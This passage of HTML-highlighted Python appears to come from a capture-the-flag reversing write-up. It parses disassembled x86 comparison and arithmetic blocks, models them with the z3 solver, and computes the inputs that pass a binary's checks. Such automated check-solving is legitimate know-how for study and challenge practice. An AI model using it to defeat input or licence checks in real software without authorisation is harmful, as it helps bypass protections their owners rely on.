</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ins</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;call&#39;</span> <span class=ow>and</span> <span class=s1>&#39;input_val&#39;</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>store_ins</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>store_ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;mov&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>store_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;eax&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>mo</span> <span class=o>=</span> <span class=n>pattern</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>store_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>mo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>store_ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;not match&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>bv</span> <span class=o>=</span> <span class=n>BitVec</span><span class=p>(</span><span class=n>store_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>user_input</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>bv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>symbols</span><span class=p>[</span><span class=n>store_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]]</span> <span class=o>=</span> <span class=n>bv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>ops</span><span class=p>[</span><span class=n>ins</span><span class=o>.</span><span class=n>opcode</span><span class=p>](</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>65535</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>solver</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>user_input</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>v</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>ret</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>v</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>ret</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mh>0x5f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;unsat&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_array</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=k>match</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;solve_array&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>block</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solver</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>symbols</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern</span>  <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\[rbp-(\w+)\]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern2</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\[rip\+(\w+)\]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>user_input</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;movzx&#39;</span><span class=p>:</span> <span class=n>mov</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;mov&#39;</span><span class=p>:</span> <span class=n>mov</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;add&#39;</span><span class=p>:</span> <span class=n>add</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;sub&#39;</span><span class=p>:</span> <span class=n>sub</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;cmp&#39;</span><span class=p>:</span> <span class=n>cmp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;xor&#39;</span><span class=p>:</span> <span class=n>xor</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;not&#39;</span><span class=p>:</span> <span class=n>bitwise_not</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>block</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ins</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;call&#39;</span> <span class=ow>and</span> <span class=s1>&#39;input_line&#39;</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>mov_esi</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>mov_esi</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;mov&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>mov_esi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;esi&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>length</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mov_esi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>lea_ins</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>    <span class=c1># lea    rax,[rbp-0x6e0]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>lea_ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;lea&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>lea_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;rax&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>mo</span> <span class=o>=</span> <span class=n>pattern</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>lea_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mo</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;invalid option: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>lea_ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;length = </span><span class=si>%#x</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;BYTE PTR [rbp-</span><span class=si>%#x</span><span class=s1>]&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>base</span><span class=o>-</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>bv</span> <span class=o>=</span> <span class=n>BitVec</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>symbols</span><span class=p>[</span><span class=n>key</span><span class=p>]</span> <span class=o>=</span> <span class=n>bv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>user_input</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>bv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;lea&#39;</span><span class=p>,</span> <span class=s1>&#39;test&#39;</span><span class=p>,</span> <span class=s1>&#39;setz&#39;</span><span class=p>,</span> <span class=s1>&#39;sete&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;call&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>lea_rsi</span> <span class=o>=</span> <span class=n>block</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>lea_rsi</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;lea&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>lea_rsi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;rsi&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>mo</span> <span class=o>=</span> <span class=n>pattern2</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>lea_rsi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=ow>not</span> <span class=n>mo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;invalid lea_rsi: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>lea_rsi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>pos</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mo</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>lea_rsi</span><span class=o>.</span><span class=n>choice</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x400000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>value</span> <span class=o>=</span> <span class=n>bin_content</span><span class=p>[</span><span class=n>pos</span><span class=p>:</span><span class=n>pos</span><span class=o>+</span><span class=n>length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;BYTE PTR [rbp-</span><span class=si>%#x</span><span class=s1>]&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>base</span><span class=o>-</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>symbols</span><span class=p>[</span><span class=n>key</span><span class=p>]</span> <span class=o>==</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=n>value</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;mov&#39;</span> <span class=ow>and</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;rax&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;al&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s1>&#39;eax&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>args</span> <span class=o>=</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>ops</span><span class=p>[</span><span class=n>ins</span><span class=o>.</span><span class=n>opcode</span><span class=p>](</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>65</span><span class=p>,</span> <span class=mi>90</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>solver</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>user_input</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ret</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>m</span><span class=p>[</span><span class=n>user_input</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;unsat&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>walk</span><span class=p>(</span><span class=n>io</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>instructions</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>block</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ins</span> <span class=o>=</span> <span class=n>mapping</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span> <span class=o>!=</span> <span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>block</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;handling block with </span><span class=si>%d</span><span class=s1> instructions&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>block</span><span class=p>),</span> <span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>exits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>block</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;cmp&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># math</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jz&#39;</span><span class=p>,</span> <span class=s1>&#39;je&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jnz&#39;</span><span class=p>,</span> <span class=s1>&#39;jne&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jz&#39;</span><span class=p>,</span> <span class=s1>&#39;je&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jnz&#39;</span><span class=p>,</span> <span class=s1>&#39;jne&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
